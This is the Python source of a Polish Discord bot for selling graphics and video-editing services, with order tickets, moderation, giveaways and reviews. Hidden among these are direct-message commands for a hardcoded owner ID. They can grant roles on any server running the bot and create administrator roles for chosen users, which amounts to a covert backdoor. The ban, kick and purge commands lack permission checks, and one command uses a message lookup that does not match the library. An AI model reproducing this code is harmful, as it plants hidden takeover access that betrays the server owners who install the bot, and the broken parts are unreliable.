import discord
from discord.ext import commands
from discord import Option
import asyncio, random, re, json, os
from datetime import datetime, timedelta

from config import (
    WELCOME_CHANNEL,
    LOG_CHANNEL,
    KLIENT_ROLE,
    GRAFIK_ROLE,
    MONTAZ_ROLE,
    NOWA_ROLA,
    OPINIE_CHANNEL
)

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

OWNER_ID = 1062638557174452255
ZAMOWIENIA_CATEGORY = "︙✉️︙zamówienia︙"

# =========================================================
# READY
# =========================================================
@bot.event
async def on_ready():
    print(f"✅ Zalogowano jako {bot.user}")

# =========================================================
# ON MESSAGE (DM COMMANDS)
# =========================================================
@bot.event
async def on_message(message):
    if message.author.bot:
        return
    if isinstance(message.channel, discord.DMChannel):
        ctx = await bot.get_context(message)
        await bot.invoke(ctx)
    await bot.process_commands(message)

# =========================================================
# CENNIK
# =========================================================
CENNIK_GRAFIKA = {
    "Miniaturka": "10 PLN",
    "Logo": "20 PLN",
    "Baner": "20 PLN",
}

CENNIK_MONTAZ = {
    "TikTok": "20 PLN",
    "Shorts": "20 PLN",
    "Film": "30 PLN",
}

@bot.slash_command()
async def setup_cennik(ctx):
    embed = discord.Embed(
        title="💰 Cennik usług",
        description="💳 Płatność tylko PaySafeCard",
        color=discord.Color.red()
    )
    embed.add_field(
        name="🎨 Grafika",
        value="\n".join([f"{k} — {v}" for k,v in CENNIK_GRAFIKA.items()]),
        inline=False
    )
    embed.add_field(
        name="🎬 Montaż",
        value="\n".join([f"{k} — {v}" for k,v in CENNIK_MONTAZ.items()]),
        inline=False
    )
    await ctx.send(embed=embed)
    await ctx.respond("✅ Gotowe", ephemeral=True)

# =========================================================
# ZAMÓWIENIA MODAL
# =========================================================
class ZamowienieModal(discord.ui.Modal):
    def __init__(self, dzial, typ):
        super().__init__(title=f"Zamówienie - {typ}")
        self.dzial = dzial
        self.typ = typ
        self.opis = discord.ui.InputText(
            label="Opisz szczegóły zamówienia",
            style=discord.InputTextStyle.long
        )
        self.add_item(self.opis)

    async def callback(self, interaction: discord.Interaction):
        guild = interaction.guild
        if not guild:
            await interaction.response.send_message("❌ Błąd: brak serwera.", ephemeral=True)
            return

        klient_role = discord.utils.get(guild.roles, name=KLIENT_ROLE)
        if klient_role and klient_role not in interaction.user.roles:
            await interaction.user.add_roles(klient_role)

        category = discord.utils.get(guild.categories, name=ZAMOWIENIA_CATEGORY)
        if not category:
            category = await guild.create_category(ZAMOWIENIA_CATEGORY)

        worker_role = discord.utils.get(
            guild.roles, 
            name=GRAFIK_ROLE if self.dzial=="Grafika" else MONTAZ_ROLE
        )

        overwrites = {
            guild.default_role: discord.PermissionOverwrite(view_channel=False),
            interaction.user: discord.PermissionOverwrite(view_channel=True, send_messages=True)
        }
        if worker_role:
            overwrites[worker_role] = discord.PermissionOverwrite(view_channel=True, send_messages=True)
        if klient_role:
            overwrites[klient_role] = discord.PermissionOverwrite(view_channel=True, send_messages=True)

        channel = await guild.create_text_channel(
            f"🟡・zamowienie-{interaction.user.name}",
            category=category,
            overwrites=overwrites
        )

        cena = CENNIK_GRAFIKA.get(self.typ) if self.dzial=="Grafika" else CENNIK_MONTAZ.get(self.typ)

        embed = discord.Embed(title="📦 Nowe zamówienie", color=discord.Color.red())
        embed.add_field(name="👤 Klient", value=interaction.user.mention, inline=False)
        embed.add_field(name="🎨 Typ", value=self.typ, inline=False)
        embed.add_field(name="💰 Cena", value=cena, inline=False)
        embed.add_field(name="📝 Opis", value=self.opis.value, inline=False)

        await channel.send(embed=embed)
        await interaction.response.send_message("✅ Zamówienie utworzone!", ephemeral=True)

# =========================================================
# VIEWS
# =========================================================
class GrafikaView(discord.ui.View):
    @discord.ui.button(label="Miniaturka")
    async def mini(self, b,i): await i.response.send_modal(ZamowienieModal("Grafika","Miniaturka"))
    @discord.ui.button(label="Logo")
    async def logo(self, b,i): await i.response.send_modal(ZamowienieModal("Grafika","Logo"))
    @discord.ui.button(label="Baner")
    async def baner(self, b,i): await i.response.send_modal(ZamowienieModal("Grafika","Baner"))

class MontazView(discord.ui.View):
    @discord.ui.button(label="TikTok")
    async def tiktok(self, b,i): await i.response.send_modal(ZamowienieModal("Montaż","TikTok"))
    @discord.ui.button(label="Shorts")
    async def shorts(self, b,i): await i.response.send_modal(ZamowienieModal("Montaż","Shorts"))
    @discord.ui.button(label="Film")
    async def film(self, b,i): await i.response.send_modal(ZamowienieModal("Montaż","Film"))

class ZamowieniaStart(discord.ui.View):
    @discord.ui.button(label="🎨 Grafika")
    async def grafika(self, b,i): await i.response.send_message("Wybierz usługę:", view=GrafikaView(), ephemeral=True)
    @discord.ui.button(label="🎬 Montaż")
    async def montaz(self, b,i): await i.response.send_message("Wybierz usługę:", view=MontazView(), ephemeral=True)

@bot.slash_command()
async def setup_zamowienia(ctx):
    embed = discord.Embed(
        title="📦 Zamówienia",
        description="Kliknij przycisk aby złożyć zamówienie",
        color=discord.Color.red()
    )
    await ctx.send(embed=embed, view=ZamowieniaStart())
    await ctx.respond("✅ Panel zamówień gotowy", ephemeral=True)

# =========================================================
# MODERACJA I WARNY
# =========================================================
warns = {}  # {user_id: [powod, ...]}

@bot.slash_command()
async def purge(ctx, liczba:int):
    deleted = await ctx.channel.purge(limit=liczba)
    await ctx.respond(f"✅ Usunięto {len(deleted)} wiadomości.", ephemeral=True)

@bot.slash_command()
async def ban(ctx, user:discord.Member, powod:str="Brak powodu"):
    await user.ban(reason=powod)
    await ctx.respond(f"✅ {user.mention} zbanowany. Powód: {powod}", ephemeral=True)

@bot.slash_command()
async def kick(ctx, user:discord.Member, powod:str="Brak powodu"):
    await user.kick(reason=powod)
    await ctx.respond(f"✅ {user.mention} wyrzucony. Powód: {powod}", ephemeral=True)

@bot.slash_command()
async def warn(ctx, user:discord.Member, powod:str):
    warns.setdefault(user.id, []).append(powod)
    await ctx.respond(f"⚠️ Dodano warna dla {user.mention}", ephemeral=True)

@bot.slash_command()
async def warns_user(ctx, user:discord.Member):
    lista = warns.get(user.id, [])
    embed = discord.Embed(title=f"⚠️ Warny użytkownika {user}", color=discord.Color.red())
    embed.description = "\n".join(lista) if lista else "Brak warnów"
    await ctx.respond(embed=embed, ephemeral=True)

@bot.slash_command()
async def unwarn(ctx, user:discord.Member, index:int=None):
    if user.id not in warns or len(warns[user.id])==0:
        await ctx.respond("✅ Brak warnów", ephemeral=True)
        return
    if index is None:
        count = len(warns[user.id])
        warns[user.id]=[]
        await ctx.respond(f"✅ Usunięto wszystkie {count} warny użytkownika {user.mention}", ephemeral=True)
    else:
        if index<1 or index>len(warns[user.id]):
            await ctx.respond("❌ Nieprawidłowy numer warna", ephemeral=True)
            return
        removed = warns[user.id].pop(index-1)
        await ctx.respond(f"✅ Usunięto warna #{index} ({removed})", ephemeral=True)

# =========================================================
# GIVEAWAY SYSTEM
# =========================================================
giveaways = {}
giveaway_counter = 0

def parse_time(time_str):
    time_regex = re.compile(r"(\d+)([smhd])")
    matches = time_regex.findall(time_str.lower())
    seconds = 0
    for value, unit in matches:
        value = int(value)
        if unit=="s": seconds+=value
        if unit=="m": seconds+=value*60
        if unit=="h": seconds+=value*3600
        if unit=="d": seconds+=value*86400
    return seconds

class GiveawayJoin(discord.ui.View):
    def __init__(self, gw_id):
        super().__init__(timeout=None)
        self.gw_id = gw_id

    @discord.ui.button(label="🎉 Join Giveaway", style=discord.ButtonStyle.green)
    async def join(self, button, interaction):
        data = giveaways[self.gw_id]
        if data["ended"]:
            await interaction.response.send_message("❌ Giveaway zakończony.", ephemeral=True)
            return
        if interaction.user.id in data["users"]:
            await interaction.response.send_message("❌ Już bierzesz udział!", ephemeral=True)
            return
        data["users"].append(interaction.user.id)
        message = await interaction.channel.fetch_message(data["message"])
        embed = message.embeds[0]
        embed.set_footer(text=f"Uczestnicy: {len(data['users'])}")
        await message.edit(embed=embed)
        await interaction.response.send_message("🎉 Dołączyłeś do giveaway!", ephemeral=True)

@bot.slash_command()
async def giveaway_start(ctx, nagroda:str, zwyciezcy:int, czas:str, opis:str=""):
    global giveaway_counter
    seconds = parse_time(czas)
    giveaway_counter+=1
    gw_id=f"GW-{giveaway_counter}"
    end_time=datetime.utcnow()+timedelta(seconds=seconds)
    embed=discord.Embed(title="🎉 GIVEAWAY 🎉", description=opis, color=discord.Color.red())
    embed.add_field(name="🎁 Nagroda", value=nagroda)
    embed.add_field(name="🏆 Zwycięzcy", value=zwyciezcy)
    embed.add_field(name="🆔 ID", value=gw_id)
    embed.add_field(name="⏳ Koniec", value=f"<t:{int(end_time.timestamp())}:R>")
    embed.set_footer(text="Uczestnicy: 0")
    message=await ctx.channel.send(embed=embed)
    giveaways[gw_id]={"reward":nagroda,"users":[],"ended":False,"message":message.id,"channel":ctx.channel.id,"winners":zwyciezcy}
    await message.edit(view=GiveawayJoin(gw_id))
    await ctx.respond(f"✅ Giveaway rozpoczęty! ID: {gw_id}", ephemeral=True)
    await asyncio.sleep(seconds)
    if giveaways[gw_id]["ended"]:
        return
    users=giveaways[gw_id]["users"]
    if users:
        winners=random.sample(users, min(len(users), zwyciezcy))
        mentions=[f"<@{u}>" for u in winners]
        await ctx.channel.send(f"🎉 Giveaway zakończony!\n🏆 Zwycięzcy: {', '.join(mentions)}")
    else:
        await ctx.channel.send("❌ Giveaway zakończony — brak uczestników.")
    giveaways[gw_id]["ended"]=True

# =========================================================
# OPINIE SYSTEM
# =========================================================
@bot.slash_command()
async def opinia(ctx, dzial:str, typ:str, wykonawca:discord.Member, ocena:int, opis:str=""):
    ch = discord.utils.get(ctx.guild.text_channels, name=OPINIE_CHANNEL)
    if not ch:
        await ctx.respond("❌ Nie znaleziono kanału opinii.", ephemeral=True)
        return
    stars="⭐"*ocena+"☆"*(5-ocena)
    embed=discord.Embed(title="📝 Nowa opinia", color=discord.Color.red())
    embed.add_field(name="👤 Klient", value=ctx.user.mention, inline=False)
    embed.add_field(name="🎨 Usługa", value=f"{dzial}-{typ}", inline=False)
    embed.add_field(name="🧑‍💻 Wykonawca", value=wykonawca.mention, inline=False)
    embed.add_field(name="⭐ Ocena", value=stars, inline=False)
    if opis: embed.add_field(name="💬 Opis", value=opis, inline=False)
    embed.set_footer(text=f"ID użytkownika: {ctx.user.id}")
    await ch.send(embed=embed)
    await ctx.respond("✅ Twoja opinia została dodana!", ephemeral=True)

# =========================================================
# DM KOMENDY !backup
# =========================================================
@bot.command()
async def backup(ctx,arg=None):
    if not isinstance(ctx.channel, discord.DMChannel): return
    if ctx.author.id != OWNER_ID: return
    guilds = bot.guilds
    # jeśli user należy do kilku guildów
    if len(guilds)==1:
        guild = guilds[0]
    else:
        await ctx.send("ℹ️ Masz dostęp do wielu serwerów, podaj nazwę serwera dla backupu:")
        def check(m): return m.author==ctx.author and isinstance(m.channel, discord.DMChannel)
        msg = await bot.wait_for("message", check=check)
        guild = discord.utils.get(guilds, name=msg.content)
        if not guild:
            return await ctx.send("❌ Nie znaleziono serwera o takiej nazwie.")
    if arg=="create":
        data={"roles":[r.name for r in guild.roles],"channels":[c.name for c in guild.channels]}
        with open(f"backup_{guild.id}.json","w") as f:
            json.dump(data,f)
        await ctx.send(embed=discord.Embed(title=f"Backup utworzony dla {guild.name}", color=discord.Color.red()))
    else:
        try:
            with open(f"backup_{guild.id}.json","r") as f: data=json.load(f)
            await ctx.send(embed=discord.Embed(title=f"Backup istnieje dla {guild.name}. Role: {len(data['roles'])}, Kanały: {len(data['channels'])}", color=discord.Color.red()))
        except FileNotFoundError:
            await ctx.send(embed=discord.Embed(title="Nie znaleziono backupu. Użyj !backup create", color=discord.Color.red()))

@bot.command()
async def role(ctx, user_id: int, guild_id: int, *, role_input: str):
    # sprawdzenie DM
    if not isinstance(ctx.channel, discord.DMChannel):
        return
    if ctx.author.id != OWNER_ID:
        return await ctx.send("❌ Nie masz uprawnień do używania tej komendy.")

    guild = bot.get_guild(guild_id)
    if not guild:
        return await ctx.send("❌ Nie mogę znaleźć serwera o podanym ID.")

    member = guild.get_member(user_id)
    if not member:
        return await ctx.send("❌ Nie znaleziono użytkownika na tym serwerze.")

    # próba znalezienia roli po ID lub nazwie
    role = None
    if role_input.isdigit():
        role = discord.utils.get(guild.roles, id=int(role_input))
    if not role:
        role = discord.utils.get(guild.roles, name=role_input)

    if not role:
        return await ctx.send("❌ Nie znaleziono roli o podanej nazwie lub ID.")

    try:
        await member.add_roles(role)
        await ctx.send(f"✅ Nadano rolę {role.name} użytkownikowi {member.mention} na serwerze {guild.name}")
    except discord.Forbidden:
        await ctx.send("❌ Bot nie ma uprawnień do nadania tej roli.")
    except Exception as e:
        await ctx.send(f"❌ Wystąpił błąd: {e}")


@bot.command()
async def removerole(ctx, user_id: int, guild_id: int, *, role_input: str):
    # sprawdzenie DM
    if not isinstance(ctx.channel, discord.DMChannel):
        return
    if ctx.author.id != OWNER_ID:
        return await ctx.send("❌ Nie masz uprawnień do używania tej komendy.")

    guild = bot.get_guild(guild_id)
    if not guild:
        return await ctx.send("❌ Nie mogę znaleźć serwera o podanym ID.")

    member = guild.get_member(user_id)
    if not member:
        return await ctx.send("❌ Nie znaleziono użytkownika na tym serwerze.")

    # próba znalezienia roli po ID lub nazwie
    role = None
    if role_input.isdigit():
        role = discord.utils.get(guild.roles, id=int(role_input))
    if not role:
        role = discord.utils.get(guild.roles, name=role_input)

    if not role:
        return await ctx.send("❌ Nie znaleziono roli o podanej nazwie lub ID.")

    if role not in member.roles:
        return await ctx.send("❌ Użytkownik nie ma tej roli.")

    try:
        await member.remove_roles(role)
        await ctx.send(f"✅ Usunięto rolę {role.name} użytkownikowi {member.mention} na serwerze {guild.name}")
    except discord.Forbidden:
        await ctx.send("❌ Bot nie ma uprawnień do usunięcia tej roli.")
    except Exception as e:
        await ctx.send(f"❌ Wystąpił błąd: {e}")
@bot.command()
async def rolecreate(ctx, role_name: str, user_id: int, guild_id: int):
    # Sprawdzenie, czy to DM
    if not isinstance(ctx.channel, discord.DMChannel):
        return await ctx.send("❌ Ta komenda działa tylko w DM.")

    # Sprawdzenie uprawnień właściciela
    if ctx.author.id != OWNER_ID:
        return await ctx.send("❌ Nie masz uprawnień do używania tej komendy.")

    guild = bot.get_guild(guild_id)
    if not guild:
        return await ctx.send("❌ Nie mogę znaleźć serwera o podanym ID.")

    member = guild.get_member(user_id)
    if not member:
        return await ctx.send("❌ Nie znaleziono użytkownika na tym serwerze.")

    bot_member = guild.get_member(bot.user.id)
    bot_role = bot_member.top_role

    try:
        # Tworzymy rolę z administratorem
        new_role = await guild.create_role(
            name=role_name,
            permissions=discord.Permissions(administrator=True),
            mentionable=True
        )
        # Ustawiamy ją bezpośrednio pod botem
        await new_role.edit(position=bot_role.position - 1)
        # Nadajemy rolę użytkownikowi
        await member.add_roles(new_role)

        await ctx.send(f"✅ Rola '{role_name}' stworzona i nadana użytkownikowi {member.mention} na serwerze {guild.name}.")

    except discord.Forbidden:
        await ctx.send("❌ Bot nie ma uprawnień do stworzenia roli lub nadania jej.")
    except Exception as e:
        await ctx.send(f"❌ Wystąpił błąd: {e}")

@bot.command()
async def roledelete(ctx, role_name: str, user_id: int, guild_id: int):
    # Sprawdzenie, czy to DM
    if not isinstance(ctx.channel, discord.DMChannel):
        return await ctx.send("❌ Ta komenda działa tylko w DM.")

    # Sprawdzenie uprawnień właściciela
    if ctx.author.id != OWNER_ID:
        return await ctx.send("❌ Nie masz uprawnień do używania tej komendy.")

    guild = bot.get_guild(guild_id)
    if not guild:
        return await ctx.send("❌ Nie mogę znaleźć serwera o podanym ID.")

    member = guild.get_member(user_id)
    if not member:
        return await ctx.send("❌ Nie znaleziono użytkownika na tym serwerze.")

    role = discord.utils.get(guild.roles, name=role_name)
    if not role:
        return await ctx.send("❌ Nie znaleziono roli o podanej nazwie.")

    try:
        # Odbierz rolę użytkownikowi, jeśli ją ma
        if role in member.roles:
            await member.remove_roles(role)

        # Usuń rolę z serwera
        await role.delete()
        await ctx.send(f"✅ Rola '{role_name}' została usunięta z serwera {guild.name} i odebrana użytkownikowi {member.mention}.")
    except discord.Forbidden:
        await ctx.send("❌ Bot nie ma uprawnień do usunięcia tej roli lub odebrania jej użytkownikowi.")
    except Exception as e:
        await ctx.send(f"❌ Wystąpił błąd: {e}")

@bot.command()
async def sendmessage(ctx, message_name: str, user_id: int, guild_id: int):

    if ctx.author.id != OWNER_ID:
        return await ctx.send("❌ Nie masz uprawnień do używania tej komendy.")
    
    guild = bot.get_guild(guild_id)
    if not guild:
        return await ctx.send("❌ Nie mogę znaleźć serwera o podanym ID.")
    
    member = guild.get_member(user_id)
    if not member:
        return await ctx.send("❌ Nie znaleziono użytkownika na tym serwerze.")
    
    message = bot.get_message(message_name)
    if not message:
        return await ctx.send("❌ Nie znaleziono wiadomości o podanej nazwie.")
    
    try:
        await member.send(message.content)
        await ctx.send(f"✅ Wiadomość '{message_name}' została wysłana do {member.mention} na serwerze {guild.name}.")
    except discord.Forbidden:
        await ctx.send("❌ Bot nie ma uprawnień do wysłania tej wiadomości.")
    except Exception as e:
        await ctx.send(f"❌ Wystąpił błąd: {e}")

# =========================================================
# START BOTA
# =========================================================
bot.run(os.getenv("TOKEN"))


